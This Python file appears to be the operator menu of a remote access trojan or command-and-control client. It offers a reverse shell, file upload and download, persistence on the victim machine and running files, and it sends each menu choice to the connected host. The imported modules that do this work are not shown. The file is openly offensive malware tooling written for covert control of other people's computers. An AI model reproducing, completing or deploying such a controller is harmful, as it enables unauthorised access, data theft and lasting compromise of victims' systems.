from core.utils import clear_screen, display_msg
from core.features.shell import run_reverse_shell
from core.features.filetransfer import upload, download
from core.features.persistance import become_persistant
from colorama import Fore, Style
from colorama import init
import time

init()


def show_options():
    
    print(Fore.GREEN + "\t\t[ 01 ] Reverse Shell"+ Style.RESET_ALL)
    print(Fore.GREEN + "\t\t[ 02 ] Upload files" + Style.RESET_ALL)
    print(Fore.GREEN + "\t\t[ 03 ] Download files and folders" + Style.RESET_ALL)
    print(Fore.GREEN + "\t\t[ 04 ] Become Persistant " + Style.RESET_ALL)
    print(Fore.GREEN + "\t\t[ 05 ] Run File " + Style.RESET_ALL)
    
    
    print('\n')
    print(Fore.YELLOW + "\t\t[ ** ] Enter 'stop', 'quit' or 'exit'  to stop"+ Style.RESET_ALL)
    print("\n")
    

def connection_handler(server):
    active_connection = True

    while active_connection:
        show_options()
        option = input("[*] Select Option : ")
        server.send(option)
        if option == "1":
            
            run_reverse_shell(server)
        elif option == "2":
            upload(server)
        elif option == "3":
            download(server)

        elif option == "4":
            become_persistant(server)
            
        elif option == "exit" or option == "99" or option == "stop" or option == "quit":
            break

        else:
            display_msg("Invalid option, try again", "r")
            time.sleep(2)



